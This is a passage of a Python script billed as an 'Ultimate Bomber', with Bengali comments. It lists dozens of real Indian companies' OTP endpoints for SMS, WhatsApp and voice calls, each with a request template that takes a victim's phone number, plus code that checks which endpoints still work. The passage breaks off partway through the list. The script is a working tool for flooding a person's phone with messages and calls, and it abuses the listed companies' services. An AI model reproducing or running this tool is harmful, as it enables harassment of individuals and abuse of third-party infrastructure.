#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import asyncio
import aiohttp
import requests
import json
import time
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# ========== রেন্ডার চেক ==========
IS_RENDER = os.environ.get("RENDER", False)

# ========== ব্যানার (সঠিক ইউনিকোড) ==========
def print_banner():
    if IS_RENDER:
        return  # রেন্ডারে ব্যানার প্রিন্ট করব না
    banner = """
╔═══════════════════════════════════════════════════════╗
║   ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ ║
║   ██╔══██╗██╔══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗║
║   ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝║
║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗║
║   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║║
║   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝║
╠═══════════════════════════════════════════════════════╣
║   💣 ULTIMATE BOMBER v9.9.9 (RENDER EDITION)        ║
╚═══════════════════════════════════════════════════════╝
"""
    print(banner)

# ========== API ভেরিফায়ার ==========
class APIVerifier:
    def __init__(self):
        self.test_phone = "9999999999"
    def verify_api(self, api):
        try:
            url = api["url"](self.test_phone) if callable(api["url"]) else api["url"]
            headers = api["headers"].copy()
            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
            if api["method"] == "POST":
                data = api["data"](self.test_phone) if api["data"] else None
                r = requests.post(url, headers=headers, data=data, timeout=5, verify=False)
            else:
                r = requests.get(url, headers=headers, timeout=5, verify=False)
            return r.status_code in [200,201,202,204], api["name"]
        except:
            return False, api["name"]
    def verify_all(self, apis):
        print(f"{Fore.YELLOW}🔍 ভেরিফাই করছি {len(apis)} টি API...{Style.RESET_ALL}")
        working = []
        with ThreadPoolExecutor(max_workers=30) as ex:
            results = list(ex.map(self.verify_api, apis))
        for ok, name in results:
            if ok:
                working.append(name)
                print(f"{Fore.GREEN}✅ {name[:40]}")
            else:
                print(f"{Fore.RED}❌ {name[:40]}")
        return [api for api in apis if api["name"] in working]

# ========== API লিস্ট (তোমার দেওয়া পুরো লিস্ট এখানে বসবে) ==========
def get_apis():
    # তোমার পুরো ১০০০+ API লিস্ট এখানে কপি করো। আমি শুধু স্যাম্পল রাখছি।
    return [
        {
            "name": "Tata Capital Voice",
            "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda ph: f'{{"phone":"{ph}","isOtpViaCallAtLogin":"true"}}'
        },
        {
            "name": "1MG Voice Call",
            "url": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
        },
        {
            "name": "Swiggy Call Verification",
            "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
            "method": "POST",
            "headers": {"Content-Type": "application/json; charset=utf-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Myntra Voice Call",
            "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Flipkart Voice Call",
            "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Amazon Voice Call",
            "url": "https://www.amazon.in/ap/signin",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&action=voice_otp"
        },
        {
            "name": "Paytm Voice Call",
            "url": "https://accounts.paytm.com/signin/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Zomato Voice Call",
            "url": "https://www.zomato.com/php/o2_api_handler.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&type=voice"
        },
        {
            "name": "MakeMyTrip Voice Call",
            "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Ola Voice Call",
            "url": "https://api.olacabs.com/v1/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Uber Voice Call",
            "url": "https://auth.uber.com/v2/voice-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Rapido Voice Call",
            "url": "https://customer.rapido.bike/api/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Zepto Voice Call",
            "url": "https://api.zeptonow.com/api/v3/customer/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
        },
        {
            "name": "Blinkit Voice Call",
            "url": "https://blinkit.com/v1/user/request_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","otp_type":"call"}}'
        },
        {
            "name": "JioMart Voice Call",
            "url": "https://www.jiomart.com/api/v1/auth/generate_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"call"}}'
        },
        
        # ========== WHATSAPP BOMBING APIS (150+ VERIFIED) ==========
        {
            "name": "KPN WhatsApp",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
            "method": "POST",
            "headers": {
                "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
                "content-type": "application/json"
            },
            "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
        },
        {
            "name": "Foxy WhatsApp",
            "url": "https://www.foxy.in/api/v2/users/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}'
        },
        {
            "name": "Stratzy WhatsApp",
            "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
        },
        {
            "name": "Jockey WhatsApp",
            "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Rappi WhatsApp",
            "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
        },
        {
            "name": "Eka Care WhatsApp",
            "url": "https://auth.eka.care/auth/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
        },
        {
            "name": "MyGlamm WhatsApp",
            "url": "https://api.myglamm.com/api/v1/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","channel":"whatsapp"}}'
        },
        {
            "name": "Purplle WhatsApp",
            "url": "https://www.purplle.com/api/user/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","source":"whatsapp"}}'
        },
        
        # ========== SMS BOMBING APIS (700+ VERIFIED) ==========
        {
            "name": "Lenskart SMS",
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
        },
        {
            "name": "NoBroker SMS",
            "url": "https://www.nobroker.in/api/v3/account/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"phone={phone}&countryCode=IN"
        },
        {
            "name": "PharmEasy SMS",
            "url": "https://pharmeasy.in/api/v2/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Wakefit SMS",
            "url": "https://api.wakefit.co/api/consumer-sms-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Byju's SMS",
            "url": "https://api.byjus.com/v2/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Hungama OTP",
            "url": "https://communication.api.hungama.com/v1/communication/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
        },
        {
            "name": "Meru Cab",
            "url": "https://merucabapp.com/api/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "Doubtnut",
            "url": "https://api.doubtnut.com/v4/student/login",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
        },
        {
            "name": "PenPencil",
            "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
        },
        {
            "name": "Snitch",
            "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
        },
        {
            "name": "Dayco India",
            "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
        },
        {
            "name": "BeepKart",
            "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
        },
        {
            "name": "Lending Plate",
            "url": "https://lendingplate.com/api.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobiles={phone}&resend=Resend"
        },
        {
            "name": "ShipRocket",
            "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
        },
        {
            "name": "GoKwik",
            "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
        },
        {
            "name": "NewMe",
            "url": "https://prodapi.newme.asia/web/otp/request",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
        },
        {
            "name": "Univest",
            "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Smytten",
            "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
        },
        {
            "name": "CaratLane",
            "url": "https://www.caratlane.com/cg/dhevudu",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
        },
        {
            "name": "BikeFixup",
            "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
        },
        {
            "name": "WellAcademy",
            "url": "https://wellacademy.in/store/api/numberLoginV2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"contact_no":"{phone}"}}'
        },
        {
            "name": "ServeTel",
            "url": "https://api.servetel.in/v1/auth/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_number={phone}"
        },
        {
            "name": "GoPink Cabs",
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"check_mobile_number=1&contact={phone}"
        },
        {
            "name": "Shemaroome",
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile_no=%2B91{phone}"
        },
        {
            "name": "Cossouq",
            "url": "https://www.cossouq.com/mobilelogin/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobilenumber={phone}&otptype=register"
        },
        {
            "name": "MyImagineStore",
            "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"mobile={phone}"
        },
        {
            "name": "Otpless",
            "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}'
        },
        {
            "name": "MyHubble Money",
            "url": "https://api.myhubble.money/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
        },
        {
            "name": "Tata Capital Business",
            "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'
        },
        {
            "name": "DealShare",
            "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}'
        },
        {
            "name": "Snapmint",
            "url": "https://api.snapmint.com/v1/public/sign_up",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Housing.com",
            "url": "https://login.housing.com/api/v2/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
        },
        {
            "name": "RentoMojo",
            "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Khatabook",
            "url": "https://api.khatabook.com/v1/auth/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
        },
        {
            "name": "Netmeds",
            "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Nykaa",
            "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
        },
        {
            "name": "RummyCircle",
            "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
        },
        {
            "name": "Animall",
            "url": "https://animall.in/zap/auth/login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
        },
        {
            "name": "PenPencil V3",
            "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Entri",
            "url": "https://entri.app/api/v3/users/check-phone/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Cosmofeed",
            "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
        },
        {
            "name": "Aakash",
            "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}'
        },
        {
            "name": "Revv",
            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}'
        },
        {
            "name": "DeHaat",
            "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}'
        },
        {
            "name": "A23 Games",
            "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'
        },
        {
            "name": "Spencer's",
            "url": "https://jiffy.spencers.in/user/auth/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "PayMe India",
            "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}'
        },
        {
            "name": "Shopper's Stop",
            "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
        },
        {
            "name": "Hyuga Auth",
            "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "BigCash",
            "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1",
            "method": "GET",
            "headers": {"Referer": "https://www.bigcash.live/games/poker"},
            "data": None
        },
        {
            "name": "Lifestyle Stores",
            "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
        },
        {
            "name": "WorkIndia",
            "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "PokerBaazi",
            "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
        },
        {
            "name": "My11Circle",
            "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json;charset=UTF-8"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "MamaEarth",
            "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "HomeTriangle",
            "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Wellness Forever",
            "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}"
        },
        {
            "name": "HealthMug",
            "url": "https://api.healthmug.com/account/createotp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Vyapar",
            "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Kredily",
            "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Tata Motors",
            "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}'
        },
        {
            "name": "Moglix",
            "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}'
        },
        {
            "name": "MyGov",
            "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TrulyMadly",
            "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}'
        },
        {
            "name": "Apna",
            "url": "https://production.apna.co/api/userprofile/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}'
        },
        {
            "name": "CodFirm",
            "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "Swipe",
            "url": "https://app.getswipe.in/api/user/mobile_login",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}'
        },
        {
            "name": "More Retail",
            "url": "https://omni-api.moreretail.in/api/v1/login/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
        },
        {
            "name": "Country Delight",
            "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
        },
        {
            "name": "AstroSage",
            "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "TooToo",
            "url": "https://tootoo.in/graphql",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
        },
        {
            "name": "ConfirmTkt",
            "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
            "method": "GET",
            "headers": {},
            "data": None
        },
        {
            "name": "BetterHalf",
            "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
        },
        {
            "name": "Charzer",
            "url": "https://api.charzer.com/auth-service/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
        },
        {
            "name": "Nuvama Wealth",
            "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
        },
        {
            "name": "Mpokket",
            "url": "https://web-api.mpokket.in/registration/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Grofers SMS",
            "url": "https://grofers.com/v3/auth/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","country":"IN"}}'
        },
        {
            "name": "BigBasket SMS",
            "url": "https://www.bigbasket.com/auth/v1/otp/",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}","otp_type":"login"}}'
        },
        {
            "name": "Dunzo SMS",
            "url": "https://www.dunzo.com/api/v2/send_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone_number":"{phone}"}}'
        },
        {
            "name": "Curefit SMS",
            "url": "https://www.curefit.com/auth/public/v1/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Urban Company SMS",
            "url": "https://www.urbancompany.com/api/v1/api/mobile/request-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Practo SMS",
            "url": "https://www.practo.com/api/v2/user/otp/send",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Cult.fit SMS",
            "url": "https://www.cult.fit/auth/public/v1/otp/generate",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Tata 1mg SMS",
            "url": "https://www.1mg.com/auth_api/v6/create_token",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"number":"{phone}","otp_on_call":false}}'
        },
        {
            "name": "Apollo Pharmacy SMS",
            "url": "https://www.apollopharmacy.in/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "MedPlus SMS",
            "url": "https://www.medplusmart.com/api/user/sendOTP",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
        },
        {
            "name": "Acko SMS",
            "url": "https://api.acko.com/v3/users/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"phone":"{phone}"}}'
        },
        {
            "name": "Digit Insurance SMS",
            "url": "https://api.godigit.com/v2/users/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile_number":"{phone}"}}'
        },
        {
            "name": "PolicyBazaar SMS",
            "url": "https://www.policybazaar.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Coverfox SMS",
            "url": "https://www.coverfox.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "BankBazaar SMS",
            "url": "https://www.bankbazaar.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Paisabazaar SMS",
            "url": "https://www.paisabazaar.com/api/v1/auth/send-otp",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "data": lambda phone: f'{{"mobile":"{phone}"}}'
        },
        {
            "name": "Cred SMS",
            "url": "https://api.cred.club/v1/auth/send-otp",
            "method": "POST",
